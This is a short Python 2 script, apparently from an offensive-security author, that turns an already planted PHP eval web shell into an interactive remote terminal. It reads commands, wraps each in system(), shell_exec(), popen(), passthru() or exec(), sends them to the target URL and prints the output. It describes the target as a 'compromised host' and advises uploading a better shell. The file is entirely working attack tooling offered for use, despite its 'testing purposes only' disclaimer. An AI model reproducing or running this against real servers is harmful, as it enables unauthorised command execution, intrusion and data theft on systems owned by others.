#!/usr/bin/python
# shell.py
# uses the "test.py" shell.php to give a basic "shell" on target.
# I advise uploading a better shell ASAP
# infodox | insecurety.net
import sys
import requests

print """
                     Test Shell.
This "shell" is for testing out different execution functions 
on a remote host. The idea is, once you identified a working 
system execution function using test.py, you can then use this
to act as a "remote shell" or "terminal emulator" for interacting
with the compromised host. 
This is for testing purposes only. Seriously.
-               infodox | insecurety.net
"""

if len(sys.argv) != 2:
    print "Usage: ./shell.py <targeturl>"
    print "Example: ./shell.py http://localhost/test.php?eval="
    sys.exit(0)

url = sys.argv[1]

print "Select execution type to use\n"
print "1. system() function"
print "2. shell_exec() function"
print "3. popen() function"
print "4. passthru() function"
print "5. exec() function"
func = raw_input("Function to use: ")
if func == "1":
    print "[+] Using system"
    while True:
        command = raw_input("shell:~$ ")
        if command == "exit":
            sys.exit(0)
        else:
            evilphp = "system('" + command + "');"
            requri = url + evilphp
            r = requests.get(requri)
            print r.text
elif func == "2":
    print "[+] Using shell_exec"
    while True:
        command = raw_input("shell:~$ ")
        if command == "exit":
            sys.exit(0)
        else:
            evilphp = "echo shell_exec('" + command + "');"
            requri = url + evilphp
            r = requests.get(requri)
            print r.text
elif func == "3":
    print "[+] Using popen"
    while True:
        command = raw_input("shell:~$ ")
        if command == "exit":
            sys.exit(0)
        else:
            evilphp = "popen('" + command + "');"
            requri = url + evilphp
            r = requests.get(requri)
            print r.text
elif func == "4":
    print "[+] Using passthru"
    while True:
        command = raw_input("shell:~$ ")
        if command == "exit":
            sys.exit(0)
        else:
            evilphp = "passthru('" + command + "');"
            requri = url + evilphp
            r = requests.get(requri)
            print r.text
elif func == "5":
    print "[+] Using exec"
    while True:
        command = raw_input("shell:~$ ")
        if command == "exit":
            sys.exit(0)
        else:
            evilphp = "echo exec('" + command + "');"
            requri = url + evilphp
            r = requests.get(requri)
            print r.text
